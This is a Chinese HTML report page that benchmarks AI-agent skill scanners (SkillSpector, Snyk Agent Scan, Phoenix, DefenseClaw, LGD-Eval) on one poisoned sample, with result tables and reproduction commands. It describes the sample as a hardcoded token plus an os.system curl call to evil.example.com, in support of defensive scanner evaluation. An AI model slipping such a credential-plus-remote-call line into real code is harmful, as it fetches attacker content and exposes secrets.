@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>同一负对照样本 · 四家工具对照（2026-11-08）</title>
+<style>
+  :root{--navy:#0C174D;--gold:#E5B85B;--ink:#101828;--muted:#5B6472;--line:#DEE2E9;--bg:#F7F8FA;--ok:#0B7A53;--warn:#9A6700;--bad:#B42318;--nv:#6B7280}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.65 -apple-system,"Segoe UI","Microsoft YaHei",sans-serif}
+  .wrap{max-width:1080px;margin:0 auto;padding:48px 28px 64px}
+  h1{font-size:34px;line-height:1.25;margin:0 0 8px;color:var(--navy);letter-spacing:.2px}
+  .sub{color:var(--muted);font-size:15px;margin-bottom:28px}
+  .card{background:#fff;border:1px solid var(--line);border-radius:14px;padding:22px 24px;margin:18px 0}
+  h2{font-size:19px;color:var(--navy);margin:0 0 12px}
+  table{width:100%;border-collapse:collapse;font-size:14.5px}
+  th,td{padding:10px 8px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+  th{color:var(--muted);font-weight:600;font-size:13px;text-transform:uppercase;letter-spacing:.4px}
+  .chip{display:inline-block;padding:2px 9px;border-radius:999px;font-size:12.5px;font-weight:600;white-space:nowrap}
+  .ok{background:#E6F4EE;color:var(--ok)} .warn{background:#FFF4DB;color:var(--warn)} .bad{background:#FDECEA;color:var(--bad)} .nv{background:#EEF0F4;color:var(--nv)}
+  code{background:#F1F3F7;border:1px solid var(--line);border-radius:6px;padding:1px 6px;font-size:13px}
+  pre{background:#0E1526;color:#DCE3F2;border-radius:10px;padding:14px 16px;overflow:auto;font-size:13px;line-height:1.6}
+  .muted{color:var(--muted);font-size:14px}
+  .foot{border-top:1px solid var(--line);margin-top:28px;padding-top:16px;color:var(--muted);font-size:12.5px}
+  .kpi{display:flex;gap:14px;flex-wrap:wrap}
+  .kpi div{flex:1;min-width:200px;background:#fff;border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+  .kpi b{display:block;font-size:24px;color:var(--navy)}
+  a{color:#1D4ED8;text-decoration:none} a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>同一负对照样本 · 四家工具对照</h1>
+  <div class="sub">2026-11-08 · 独立复跑与文档取证 · 仅列可核对结果，NV 不写成通过</div>
+
+  <div class="card">
+    <h2>一、样本（同一样本，四方对照）</h2>
+    <p><code>evil.py</code>：硬编码凭证 <code>ghp_aaaa…</code> + <code>os.system("curl http://evil.example.com/x")</code>；<code>SKILL.md</code> 声明为普通演示技能。<br>
+    对照组：<code>iso14971-risk-matrix</code>（干净技能，无危险调用）。</p>
+    <div class="kpi">
+      <div><b>1</b><span class="muted">个负对照样本</span></div>
+      <div><b>4</b><span class="muted">家工具对照</span></div>
+      <div><b>2</b><span class="muted">家真跑（其余文档/NV）</span></div>
+      <div><b>FAIL</b><span class="muted">我方 fail-closed 结论</span></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>二、结果</h2>
+    <table>
+      <thead><tr><th>工具</th><th>版本 / 方式</th><th>结论</th><th>是否阻断</th><th>证据状态</th></tr></thead>
+      <tbody>
+        <tr><td>NVIDIA SkillSpector</td><td>2.12.0 · 本地 pip 安装真跑</td><td>34 / MEDIUM / CAUTION（含 HIGH 的 os.system）</td><td>❌ 不阻断</td><td><span class="chip ok">✅ 真跑</span></td></tr>
+        <tr><td>Snyk Agent Scan</td><td>0.6.11 · pip 安装，headless 未出结果</td><td>无稳定 stdout；CI 需 <code>--dangerously-run-mcp-servers</code></td><td>NV</td><td><span class="chip nv">NV</span></td></tr>
+        <tr><td>Arize Phoenix</td><td>19.18.0 · 本地服务 + OTLP trace</td><td>可观测/评测平台；trace 入库成功</td><td>非门禁</td><td><span class="chip ok">✅ 真跑</span></td></tr>
+        <tr><td>Cisco DefenseClaw</td><td>文档级（Apache-2.0 / Go）</td><td>CRITICAL/HIGH → 隔离 + 阻断；扫描失败 = rejected</td><td>✅（文档）</td><td><span class="chip warn">📄 文档</span></td></tr>
+        <tr><td><b>LGD-Eval（本工具）</b></td><td>自包含 engine · 本地复跑</td><td><b>assessment_outcome = FAIL</b>；safety_clear=false；无 ALLOW</td><td>✅ fail-closed</td><td><span class="chip ok">✅ 真跑</span></td></tr>
+      </tbody>
+    </table>
+    <p class="muted">注：Cisco 的 fail-closed 语义来自官方文档（扫描失败=rejected、HIGH 隔离），并非我方实测；本页不把它写成“已验证”。</p>
+  </div>
+
+  <div class="card">
+    <h2>三、可复现命令</h2>
+    <pre># NVIDIA SkillSpector（本地 pip 安装后）
+python -m skillspector.cli scan &lt;skill-dir&gt; --no-llm --format json &gt; out.json
+
+# Snyk Agent Scan（注意：无 TTY 会静默失败）
+python -m agent_scan.run  # 或入口 snyk-agent-scan；CI 需 --dangerously-run-mcp-servers
+
+# LGD-Eval（本仓）
+python work/eval-run/e2e_selfcontained.py
+# 期望：clean=PASS / poisoned=FAIL / 无 ALLOW</pre>
+    <p class="muted">SkillSpector 在 Windows 上 <code>--output</code> 不可用（“Safe file output is unsupported on this platform”），本页结果用 stdout 重定向。</p>
+  </div>
+
+  <div class="card">
+    <h2>四、怎么读这张表</h2>
+    <p>“扫描器”回答“这个技能有没有风险”；“门禁”回答“能不能放行”。前者给建议（CAUTION），后者给结论（FAIL/ALLOW）。<br>
+    本页只主张两件事：① 同一 HIGH 样本，SkillSpector 给 CAUTION、LGD-Eval 给 FAIL；② Cisco 的 fail-closed 说明“阻断”不是差异点，<b>证据等级与独立第三方复跑</b>才是。</p>
+  </div>
+
+  <div class="card">
+    <h2>五、来源</h2>
+    <ul class="muted">
+      <li><a href="https://docs.nvidia.com/skills/scanning-agent-skills">NVIDIA SkillSpector 文档</a> · <a href="https://github.com/NVIDIA/SkillSpector">GitHub</a></li>
+      <li><a href="https://pypi.org/project/snyk-agent-scan/">Snyk Agent Scan (PyPI)</a></li>
+      <li><a href="https://cisco-ai-defense.github.io/defenseclaw/docs/scanning/">Cisco DefenseClaw · Scanning and admission</a></li>
+      <li><a href="https://arize.com/phoenix/">Arize Phoenix</a></li>
+      <li>本地证据：<code>work/eval-run/skillspector/</code>、<code>work/eval-run/e2e-selfcontained.json</code>、<code>work/eval-run/phoenix/phoenix-ui.png</code></li>
+    </ul>
+  </div>
+
+  <div class="foot">
+    © 2026 Xinghua Zhao (Zhao, X.), ORCID 0009-0001-0512-1237. All rights reserved. Submitted in a personal capacity; no organizational affiliation.<br>
+    本页为技术对照，不构成对任何厂商的贬损；商标归各自权利人所有。
+  </div>
+</div>
+</body>
+</html>
